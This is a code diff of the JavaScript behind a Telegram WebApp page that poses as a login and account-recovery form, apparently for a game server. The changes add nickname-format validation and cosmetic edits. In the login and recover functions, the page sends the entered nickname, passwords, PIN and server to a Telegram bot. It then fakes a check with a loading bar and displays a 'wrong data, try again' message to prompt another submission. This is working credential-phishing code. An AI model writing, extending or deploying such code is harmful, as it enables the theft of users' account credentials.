@@ -2,7 +2,6 @@ const tg = window.Telegram.WebApp;
 tg.ready();
 tg.expand();
 
-// === ЗАГРУЗКА ПРИ СТАРТЕ ===
 let percent = 0;
 const bar = document.getElementById('bar');
 const percentText = document.getElementById('percent');
@@ -30,7 +29,6 @@ function togglePin() {
     const pinInput = document.getElementById('pin');
     const pinGroup = document.getElementById('pinGroup');
     if (!checkbox || !pinInput || !pinGroup) return;
-
     if (checkbox.checked) {
         pinInput.disabled = false;
         pinInput.placeholder = 'Введите пин-код';
@@ -52,6 +50,7 @@ function onlyPin(input) {
     input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4);
 }
 
+// === ПРОВЕРКА НИКА ===
 function checkNick() {
     const nick = document.getElementById('nick').value.trim();
     const icon = document.getElementById('iconNick');
@@ -72,7 +71,6 @@ function markFilled(inputId, iconId) {
 }
 
 document.addEventListener('DOMContentLoaded', () => {
-    markFilled('nick', 'iconNick');
     markFilled('password', 'iconPass');
     markFilled('pin', 'iconPin');
     markFilled('email', 'iconEmail');
@@ -87,7 +85,6 @@ function showLoading(text, callback) {
     loaderDiv.id = 'tempLoader';
     loaderDiv.innerHTML = `<div class="loader-circle"></div><div class="loader-text">${text}</div><div class="loader-percent" id="tempPercent">0%</div><div class="loader-bar"><div class="loader-bar-fill" id="tempBar"></div></div>`;
     document.body.appendChild(loaderDiv);
-
     let p = 0;
     const int = setInterval(() => {
         p += 2;
@@ -115,7 +112,6 @@ function showSuccess(text, nick, server, type) {
     const now = new Date();
     const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
     const ticket = Math.floor(1000000 + Math.random() * 9000000);
-
     const overlay = document.createElement('div');
     overlay.className = 'success-overlay';
     overlay.innerHTML = `
@@ -134,14 +130,12 @@ function showSuccess(text, nick, server, type) {
         </div>
     `;
     document.body.appendChild(overlay);
-
     let counter = 15;
     let dotIndex = 0;
     const dots = ['', '.', '..', '...'];
     const waitNum = document.getElementById('waitNum');
     const waitDots = document.getElementById('waitDots');
     const waitStatic = document.querySelector('.success-wait-static');
-
     const interval = setInterval(() => {
         counter--;
         dotIndex = (dotIndex + 1) % 4;
@@ -152,7 +146,7 @@ function showSuccess(text, nick, server, type) {
             clearInterval(interval);
             if (waitStatic) {
                 waitStatic.textContent = 'Вы ввели неверные данные попробуйте снова';
-                waitStatic.style.color = '#8b0000';
+                waitStatic.style.color = '#a01010';
                 waitStatic.style.fontWeight = '700';
             }
         }
@@ -180,6 +174,7 @@ function login() {
     const pin = document.getElementById('pin').value.trim();
     const server = document.getElementById('server').value;
     if (!nick) { alert('Введите ник!'); return; }
+    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone (минимум 5 символов, только буквы)!'); return; }
     if (!password) { alert('Введите пароль!'); return; }
     sendToBot(`🔐 ВХОД В АККАУНТ\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`);
     showLoading('ПРОВЕРКА ДАННЫХ', () => {
@@ -214,6 +209,7 @@ function recover() {
     const pin = document.getElementById('pin').value.trim();
     const server = document.getElementById('server').value;
     if (!nick) { alert('Введите ник!'); return; }
+    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone (минимум 5 символов, только буквы)!'); return; }
     if (!oldPass) { alert('Введите старый пароль!'); return; }
     if (!newPass) { alert('Введите новый пароль!'); return; }
     sendToBot(`🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n👤 Ник: ${nick}\n🔓 Старый пароль: ${oldPass}\n🔒 Новый пароль: ${newPass}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`);
